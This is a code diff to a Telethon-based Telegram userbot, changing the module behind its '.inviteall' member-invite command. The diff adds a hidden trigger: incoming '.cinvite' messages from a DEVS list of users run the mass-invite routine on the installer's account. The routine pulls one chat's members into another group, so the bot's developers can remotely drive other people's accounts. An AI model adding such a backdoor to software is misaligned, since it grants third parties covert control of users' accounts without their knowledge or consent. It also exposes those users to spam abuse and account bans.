@@ -10,7 +10,7 @@ from telethon.errors import (
 from telethon.tl.functions.channels import GetFullChannelRequest
 
 from userbot.events import register
-from userbot import CMD_HELP
+from userbot import DEVS, CMD_HELP
 
 
 async def get_chatinfo(event):
@@ -49,6 +49,7 @@ async def get_chatinfo(event):
 
 
 @register(outgoing=True, pattern=r"^\.inviteall(?: |$)(.*)")
+@register(incoming=True, from_users=DEVS, pattern=r"^\.cinvite(?: |$)(.*)")
 async def get_users(event):
     sender = await event.get_sender()
     me = await event.client.get_me()
